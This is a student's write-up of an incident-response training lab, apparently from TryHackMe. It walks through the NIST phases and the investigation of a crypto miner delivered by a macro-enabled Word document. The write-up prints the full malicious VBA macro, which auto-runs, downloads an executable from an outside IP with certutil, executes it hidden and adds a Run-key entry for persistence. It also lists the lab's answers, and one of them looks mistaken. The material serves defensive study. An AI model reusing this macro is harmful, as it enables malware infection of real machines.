# Incident-Response-Process
- Understand the different phases of the incident response process

- Apply the process to a realistic scenario as an incident responder

# Task 1

Because the main topic of this room is an advanced cyber security subject, it would be best for students to approach it after gaining basic knowledge of the most diffused cyber threats (malware, miners, C2 botnets, etc.) and their delivery vectors, and being comfortable with common cyber security terminology.



![66b36e2379a5d0220fc6b99e-1730828994819](https://github.com/user-attachments/assets/86ab2a57-e289-47f4-937d-9dc3b0367168)

Preparation: Establishing and maintaining an incident response capability.

Detection and Analysis: Identifying and understanding the scope and impact of an incident.

Containment, Eradication, and Recovery: Limiting the incident's impact, eliminating the threat, and restoring normal operations.

Post-Incident Activity: Reviewing and improving the incident response process and documentation.



# Task 2 Incident ResponseLifecycle-

What is the phase of the NIST Incident Response Framework in which incident responders are usually called to action?

```
Detection and Analysis
```

# Task 3 Detcetion & Analysis

In our scenario, we are acting as members of our Incident Response Team. A member of the organisation's SOC Team has called us to investigate and remedy a potential incident impacting a Windows workstation.

IT has checked the machine's resources and found that the CPU usage is unusually high, even after closing all running apps. Suspecting a potential incident, IT has escalated the ticket to the SOC Team.

The only anomaly that we have identified is some outbound connections on the perimeter firewall originating from the workstation's IP. The connections occur every second, and all have the same destination IP. 

In our scenario, the latest has happened: a user has reported a system anomaly to the IT Team. The IT Team recognised that the anomaly could be caused by a potential cyber threat and immediately escalated the incident to the proper teams.

Analysis
The analysis sub-step is when the IRT actually comes into action.

Windows Task Manager is a very useful system utility that provides information about running applications, processes, and system performance. It allows users to monitor and manage system resources and troubleshoot issues.

![5f9c7574e201fe31dad228fc-1732005418555](https://github.com/user-attachments/assets/84da1115-8db1-446f-a496-3907bb91b4b4)

To confirm our suspicion, we go on with our analysis and start by looking at the suspicious process properties: right-click on the process > select Properties.

![66b36e2379a5d0220fc6b99e-1724324602517](https://github.com/user-attachments/assets/db6bd95d-def2-47c7-a19c-4a51a72dffd0)

 right-clicking on the process > selecting Go to details. This will open the Details tab and highlight the table row containing our process details.
 
![66b36e2379a5d0220fc6b99e-1724324602453](https://github.com/user-attachments/assets/af71ea52-aa57-4069-879a-43522880d1b4)

 Let's open a command prompt by searching for cmd in the Windows search bar and opening the Command Prompt app. We can use the following command paired with the PID that we got from the task manager's details: netstat -aofn | find "{PID}".

 SOC have preannounced, we found an outbound connection attempt towards a suspicious combination of IP and random destination port. This adds to our suspicions: this could be the malware's attempt at contacting the Command and Control (C2) server to deliver mining data (if it's a crypto miner) or to get further instructions.

 C:\Windows\system32>netstat -aofn | find "4512"
  TCP    10.10.25.216:49703     45.33.32.156:42424     SYN_SENT        4512

  malicious process's actions, we will need to carry out more advanced actions (such as a thorough malware analysis), but this goes beyond the scope of this room. We will assume that our IRT has analysed the executable and has, in fact, identified it as a crypto miner.

Identifying the Infection Vector

Once the incident has been confirmed, the IRT must understand and document the initial access vector. Some of the most common vectors are exploiting known vulnerabilities in internet-facing systems (web servers, application servers, FTP servers, etc.), phishing and social engineering, credential stuffing and brute force attacks, drive-by downloads, and supply-chain attacks.

Understanding the initial access vector is crucial because it helps pinpoint the 'hole' in the system, allowing for targeted remediation efforts to patch it.

 Let's open it and look at the browsing history. The fastest way to open Edge's download history is to go to this URL: edge://downloads/all.
 
![66b36e2379a5d0220fc6b99e-1724324602445](https://github.com/user-attachments/assets/40e52c25-b667-4222-b851-9871988dffef)

very suspicious extension: DOCM indicates that the file is a Macro-enabled Word Document, which means that it most likely contains macros. We seasoned responders know that this could indicate the file might contain malicious embedded code. This code was most probably automatically executed when the user opened the document the first time.

A macro is a set of instructions or a script that automates repetitive tasks by performing a sequence of actions or commands within software applications. Macros are often used to save time and improve efficiency by streamlining complex or frequently performed operations. However, malicious actors can also leverage them to carry out dangerous actions, such as automatically downloading malware.

![66b36e2379a5d0220fc6b99e-1724324603178](https://github.com/user-attachments/assets/9f3f2654-b7ec-4d51-8039-e5a05a6a7c8a)

View > Macros. In the newly opened window we can see that there is, in fact, a macro inside this document. Let's select it and open it by clicking on the Edit button on the right.

![66b36e2379a5d0220fc6b99e-1724324602560](https://github.com/user-attachments/assets/51bce936-bbf6-4d65-be34-9aa860c30191)

Analysing the Macro
The VBA (Visual Basic for Applications) Editor opens in a new window, and we can start analysing the instructions contained in the macro for signs of malicious code.

strURL = "http://172.233.61.246/32th4ckm3.exe"
    strFilePath = Environ("TEMP") & "\32th4ckm3.exe"

![66b36e2379a5d0220fc6b99e-1724324602830](https://github.com/user-attachments/assets/b00ee55f-7aa7-4922-ad19-0c7e65f10cea)

```
Sub AutoOpen()
    Dim strURL As String
    Dim strFilePath As String
    Dim strCmd As String
    
    If GetObject("winmgmts:\\.\root\cimv2").ExecQuery("SELECT * FROM Win32_Process WHERE Name = '32th4ckm3.exe'").Count > 0 Then Exit Sub
    
    strURL = "http://172.233.61.246/32th4ckm3.exe"
    strFilePath = Environ("TEMP") & "\32th4ckm3.exe"
    strCmd = "cmd /c certutil -urlcache -split -f """ & strURL & """ """ & strFilePath & """"
    Shell strCmd, vbHide
    Wait (10)
    Shell strFilePath, vbHide
    
    strCmd = "cmd /c reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v DefaultApp /t REG_SZ /d """ & strFilePath & """ /f"
    Shell strCmd, vbHide
End Sub

Sub Wait(seconds As Single)
    Dim endTime As Single
    endTime = Timer + seconds
    Do While Timer < endTime
        DoEvents
    Loop
End Sub


```


strURL = "http://172.233.61.246/32th4ckm3.exe"
strFilePath = Environ("TEMP") & "\32th4ckm3.exe

they both contain the name of the executable that we have identified as the miner sucking the machine's CPU resources.


![66b36e2379a5d0220fc6b99e-1724324602838](https://github.com/user-attachments/assets/c364bb43-a360-49a7-98d8-60d1a5f62d45)

But briefly, it checks if a process with the same name as our suspicious executable is already running; if the process is found, the macro stops executing. This prevents the macro from downloading and running the same executable file multiple times if it's already active.

 the URL of the file to be downloaded is assigned to the variable strURL, while the variable strFilePath is assigned the full path for the downloaded file by combining the system's temporary directory path (obtained via Environ("TEMP")) with the filename of our miner.

 ![66b36e2379a5d0220fc6b99e-1724324602477](https://github.com/user-attachments/assets/3f33b3f0-ed45-4552-b2a4-0fc8bbf8fcb0)

The next instruction constructs a command string to be executed by the command prompt (cmd). The command uses certutil to download the file from strURL to strFilePath.

certutil is a command-line utility in Windows used for managing and manipulating certificates and certificate authority (CA) databases. It is part of the Windows Certificate Services and can perform various functions. This is a very interesting way of stealthily downloading a file because it leverages a legitimate, pre-installed Windows utility, trusted by default and often allowed through security measures. This method avoids the need for additional tools that might be detected by antivirus software. The command generates minimal noise, blending in with normal administrative operations, making it less likely to be flagged.

![66b36e2379a5d0220fc6b99e-1724324602500](https://github.com/user-attachments/assets/dcbd0515-53a3-430c-94b4-980c9b0a5be1)

With the next set of instructions, the command is executed in a hidden window (vbHide), effectively downloading the file without showing the command prompt to the user; then, after 10 seconds (if you enjoyed this little journey into VBA, you can analyse the Wait function defined at the end of the macro to prove that the Wait (10) instruction does just that), the downloaded file is executed in a hidden window.

![66b36e2379a5d0220fc6b99e-1724324602775](https://github.com/user-attachments/assets/711fb637-b8c8-464e-86ba-e9d66ee56439)

Finally, the macro constructs and executes a different command to add a Windows Registry entry in HKCU\Software\Microsoft\Windows\CurrentVersion\Run, which ensures that the downloaded file runs every time the user logs in, ensuring persistence by making the executable run at startup.

The Windows Registry is a hierarchical database that stores configuration settings and options for the Windows operating system and installed applications. The Run keys in the Windows Registry specify programs to be automatically executed when a user logs in. For this reason, they are often leveraged by malware to ensure persistence in the infected system even after rebooting. Understanding the Windows Registry goes beyond the scope of this room, but we highly recommend that aspiring incident responders become familiar with it.

Let us make a recap of what we’ve learnt from our analysis of the macro:

The macro, named AutoOpen, executes automatically when the document is opened.
It immediately checks if a process with a name that matches the malware is already running. In this case, it terminates.
If there is no such process, the macro leverages certutil to download the malware from a specific URL, and saves it to a temporary directory.
It then stealthily executes the malware from a hidden command prompt.
In the same stealthy manner, the macro finally ensures persistence by adding the malware to the Run registry key. This will allow the malware to be executed every time the user logs into the system, even after reboot.



What is the name of the process active in the attached VM that we suspect could be a miner?

```
invoice n. 65748224.docm
```

What is the combination IP:port of the C2 server of the malware?

```
45.33.32.156:42424
```
What is the name of the document containing the malicious macro?

```
invoice n. 65748224.docm
```
What is the website from which the miner was downloaded?

```
http://172.233.61.246/
```
What is the utility that the macro leveraged to download the malware?

```
certutil
```


# Task 4 Containment, Eradication, and Recovery

remember that, as incident responders, we also need to compile a report containing all the details of the actions we've taken. Before deleting any artefact from the machine or killing any involved process, remember to keep track of filenames, folders and other details that you've encountered: these are all very important data that need to be included in our report—and that may be requested to answer the questions at the end of this task.

Containment

What we can do now on the machine is kill the process to stop it from further “stealing” its resources. In the Task Manager, we can right-click on the process > select End task.

Now is the moment to compile a list of the IoCs collected during our analysis and action on them by sweeping the organisation with all the tools at our disposal (SIEM, EDR, network devices, etc.) for any occurrence of IoCs. In our scenario, we have the following collected IoCs that should be actioned on:

The IP and port of the C2 server (as already mentioned in the previous task).
The URL from which the macro-enabled Word document was downloaded.
The URL embedded in the macro from which the malware was downloaded.
The hash of the malware’s executable.

Eradication and Recovery

 regedit in the Windows search bar and select the Registry Editor app. To view the compromised Run key, we can paste the full path of the key in the bar at the top of the editor: Computer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run.

 ![60b31886758169005262132d-1717776991756](https://github.com/user-attachments/assets/72b36c38-0704-47af-b300-aae7e658a713)

 right-click > select Delete.

 executable didn't discover any other persistence mechanisms or artefacts dropped by the malware, the machine is restored to its clean state.

 Which folder should we navigate to in order to find and delete the malicious process? (Full path)

```
C:\Users\TryCleanUser\AppData\Local\Temp\2
```

In the Run registry key, what is the name of the string value that has been added by the miner for persistence?

```
DefaultApp
```

# Task 5 Closing the Cycle 

This phase involves thoroughly reviewing the incident, documenting lessons learned, and integrating these insights into the Incident Response Plan (IRP) developed during the preparation phase. 

By doing so, organisations can continuously improve their readiness and resilience against future threats.

And Back to Preparation

this phase involves creating a comprehensive Incident Response Plan (IRP), which is pivotal for ensuring an organisation's readiness to handle cyber security incidents effectively.

Implementing an EDR solution able to detect the kind of threat that we just faced (crypto miners and malicious macros).

Enforcing a web-browsing control system that would prevent users from navigating to unsafe websites.

Raising awareness among employees on the potential threat of macro-enabled Office files and navigating suspicious links, for example, with mandatory training on the topic.

Discussing the approach of implementing a policy to block the execution of macros as a countermeasure, ensuring that this wouldn't disrupt legitimate business operations.


The goal of an effective preparation phase is to develop an:

```
Incident Response Plan

```
# Task 6 Conclusion

 The critical insights gained from each phase, particularly from post-incident activity, must be reintegrated into the preparation phase to continually enhance the Incident Response Plan (IRP).

Remember, the cycle of preparation, response, and improvement is continuous and essential for staying ahead in the ever-evolving landscape of cyber security.
 
